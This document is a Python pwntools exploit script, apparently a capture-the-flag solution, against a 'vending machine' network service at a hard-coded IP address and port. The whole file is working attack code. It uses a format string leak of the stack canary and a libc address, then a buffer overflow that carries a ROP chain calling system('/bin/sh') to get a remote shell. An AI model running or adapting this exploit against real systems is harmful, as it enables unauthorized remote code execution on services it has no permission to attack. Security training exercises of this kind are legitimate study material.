#!/usr/bin/env python3
"""
Vending Machine PWN - Final Exploit
Target: 39.96.193.120:33334

Vulnerability: Format string + Buffer overflow
Exploit: Leak canary + libc, ROP to system()
"""
from pwn import *
import socket

def exploit():
    context.log_level = 'info'
    io = remote('39.96.193.120', 33334, timeout=15)
    
    # === Stage 1: Leak canary + libc ===
    io.recvuntil(b'ID:')
    # %45$p leaks canary from stack
    # %10$s leaks printf@got (8 bytes from 0x404028)
    io.send(b'%45$p%10$s' + b'A'*6 + p64(0x404028) + b'\n')
    io.recvuntil(b'Welcome, ')
    raw = io.recvuntil(b'quantity', drop=True)
    
    # Parse canary (first 18 chars: 0x + 16 hex)
    canary = int(raw[:18].decode(), 16)
    # Parse printf address (6 bytes from position 18)
    printf_addr = u64(raw[18:24].ljust(8, b'\x00'))
    
    # Calculate libc base
    libc = printf_addr - 0x61c90
    
    log.success(f'canary={hex(canary)}, libc={hex(libc)}')
    
    # === Stage 2: Complete normal rounds ===
    # Round 1
    io.send(b'1\n')
    io.recvuntil(b'product')
    io.send(b'a\n')
    io.recvuntil(b'Order confirmed!')
    
    # Round 2
    io.recvuntil(b'ID:')
    io.send(b'B\n')
    io.recvuntil(b'quantity')
    io.send(b'1\n')
    io.recvuntil(b'product')
    io.send(b'b\n')
    io.recvuntil(b'Order confirmed!')
    
    # === Stage 3: ROP exploit (Round 3) ===
    io.recvuntil(b'ID:')
    io.send(b'X'*30 + b'\n')  # customer ID
    io.recvuntil(b'quantity')
    
    # Build payload:
    # - quantity "512\n" bypasses check (512 & 0xFF = 0 <= 3)
    # - 512 bytes overflow:
    #   offset 264: canary
    #   offset 272: saved RBP
    #   offset 280: ROP chain
    system = libc + 0x52290
    binsh = libc + 0x1b45bd
    pop_rdi = libc + 0x23b6a
    
    payload = b'512\n' + b'A'*264 + p64(canary) + b'B'*8
    payload += p64(pop_rdi) + p64(binsh) + p64(system) + p64(0x401410)
    payload = payload.ljust(512, b'C')
    
    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    io.send(payload)
    
    io.recvuntil(b'Order confirmed!')
    log.success('ROP triggered!')
    
    # Wait for response
    time.sleep(1)
    out = io.recv()
    log.info(f'Output: {out}')
    print(out.decode(errors='replace'))
    
    io.close()

if __name__ == '__main__':
    exploit()